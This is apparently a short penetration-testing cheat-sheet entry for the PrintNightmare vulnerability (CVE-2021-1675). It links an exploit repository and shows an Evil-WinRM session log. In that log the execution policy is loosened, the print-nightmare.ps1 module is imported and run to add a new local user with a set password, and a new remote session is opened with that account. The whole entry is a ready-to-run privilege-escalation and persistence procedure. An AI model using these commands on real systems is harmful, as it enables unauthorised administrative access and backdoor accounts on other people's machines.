### CVE-2021-1675
> github:https://github.com/calebstewart/CVE-2021-1675

```
*Evil-WinRM* PS C:\temp> Get-executionpolicy
Restricted
*Evil-WinRM* PS C:\temp> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
*Evil-WinRM* PS C:\temp> Get-executionpolicy
Unrestricted
*Evil-WinRM* PS C:\temp> Import-Module .\print-nightmare.ps1
*Evil-WinRM* PS C:\temp> Invoke-Nightmare -NewUser "john" -NewPassword "password" -DriverName "PrintMe"
```

* new evil-winrm session
```
evil-winrm -i 192.168.1.1 -u john -p password
```
